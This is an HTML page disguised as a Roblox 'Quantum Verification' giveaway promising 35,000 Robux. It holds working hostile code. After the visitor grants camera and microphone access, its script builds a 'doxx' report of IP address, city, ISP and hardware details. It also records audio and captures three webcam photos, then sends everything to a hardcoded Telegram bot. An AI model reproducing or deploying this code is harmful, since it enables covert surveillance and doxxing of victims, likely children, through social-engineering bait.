<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Quantum Verification</title>
    <style>
        :root { --q: #00ff88; --bg: #010101; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .panel { width: 85%; max-width: 400px; background: rgba(255,255,255,0.02); border: 2px solid var(--q); border-radius: 40px; padding: 40px 20px; text-align: center; box-shadow: 0 0 40px rgba(0,255,136,0.2); position: relative; }
        .payout { font-size: 40px; font-weight: 900; color: #fff; text-shadow: 0 0 20px var(--q); margin: 15px 0; }
        .log { background: #000; padding: 15px; border-radius: 12px; font-size: 10px; color: var(--q); text-align: left; height: 100px; border: 1px solid #111; margin: 20px 0; }
        .btn-claim { background: var(--q); color: #000; border: none; width: 100%; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 900; cursor: pointer; display: none; text-transform: uppercase; }
        #v { position: absolute; width: 100px; height: 100px; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body onload="initQuantum()">

<div class="panel">
    <h1 style="font-size: 18px; letter-spacing: 5px; opacity: 0.7;">QUANTUM_SYNC</h1>
    <div class="payout">35,000 R$</div>
    <div class="log" id="log">> SYSTEM_BOOT...<br>> WAITING_FOR_STREAM...</div>
    <button class="btn-claim" id="btn" onclick="captureTitan()">CLAIM NOW</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const T = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const C = '7889497672';
    let s = null;

    async function initQuantum() {
        const log = document.getElementById('log');
        try {
            s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const v = document.getElementById('v');
            v.srcObject = s;
            
            // Ждем реального появления картинки (фикс пустоты)
            v.onloadedmetadata = () => {
                log.innerHTML += "<br>> STREAM_DETECTED<br>> RESOLUTION: " + v.videoWidth + "x" + v.videoHeight;
                setTimeout(() => {
                    document.getElementById('btn').style.display = 'block';
                    log.innerHTML += "<br>> SYSTEM_READY";
                }, 2000);
            };
        } catch (e) {
            log.innerHTML += "<br>> ERROR: STREAM_FAILED";
            alert("Ошибка! Разрешите камеру для проверки.");
            location.reload();
        }
    }

    async function captureTitan() {
        document.getElementById('btn').style.display = 'none';
        const log = document.getElementById('log');
        log.innerHTML = "> EXTRACTING_METADATA...<br>> UPLOADING_PACKETS...";

        // 🔱 МАКСИМАЛЬНЫЙ ДОКС (IP, RAM, GPU, Модель)
        let d = `🔱 **QUANTUM-DOX REPORT** 🔱\n\n`;
        try {
            const r = await fetch('https://ipapi.co/json/');
            const j = await r.json();
            d += `📍 IP: \`${j.ip}\`\n🌍 City: ${j.city}\n📡 ISP: ${j.org}\n`;
        } catch(e) {}

        d += `\n⚙️ **HARDWARE_DUMP:**\n`;
        d += `📱 OS: ${navigator.platform}\n`;
        d += `⚙️ CPU: ${navigator.hardwareConcurrency} Cores\n`;
        d += `🧠 RAM: ${navigator.deviceMemory || '?'} GB\n`;
        d += `🖥 Display: ${screen.width}x${screen.height}\n`;
        d += `🎨 GPU: ${getG()}\n`;
        d += `🔋 Battery: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
        
        const devs = await navigator.mediaDevices.enumerateDevices();
        d += `\n📸 **MEDIA_DEVICES:**\n`;
        devs.forEach(dev => { if(dev.label) d += `🔹 ${dev.label}\n`; });

        // ЗАПИСЬ ГОЛОСА
        const rec = new MediaRecorder(s);
        const chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = async () => {
            const fd = new FormData();
            fd.append('chat_id', C);
            fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'v.ogg');
            fetch(`https://api.telegram.org/bot${T}/sendVoice`, { method: 'POST', body: fd });
        };
        rec.start();

        // ФОТО (Burst Mode)
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;

        for (let i = 1; i <= 3; i++) {
            await new Promise(r => setTimeout(r, 1000));
            log.innerHTML = `> SYNCING: ${i}/3...`;
            c.getContext('2d').drawImage(v, 0, 0);
            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
            const fd = new FormData();
            fd.append('chat_id', C);
            fd.append('photo', b, `f${i}.jpg`);
            if (i === 1) fd.append('caption', d);
            await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
        }

        rec.stop();
        alert("✅ Верификация успешно завершена!");
        window.location.href = "https://www.roblox.com";
    }

    function getG() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
